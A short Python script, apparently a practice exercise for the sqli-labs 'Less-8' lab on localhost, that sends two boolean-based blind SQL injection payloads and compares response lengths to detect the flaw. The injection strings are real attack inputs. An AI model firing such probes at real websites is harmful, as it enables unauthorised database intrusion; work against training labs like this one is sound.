import requests
URL="http://127.0.0.1/sqli-labs-master/Less-8/"
payload1="?id=1' and 1=1%23"
payload2="?id=1' and 1=2%23"
a=requests.get(URL+payload1)
b=requests.get(URL+payload2)
print("a:",len(a.text),"&b:",len(b.text))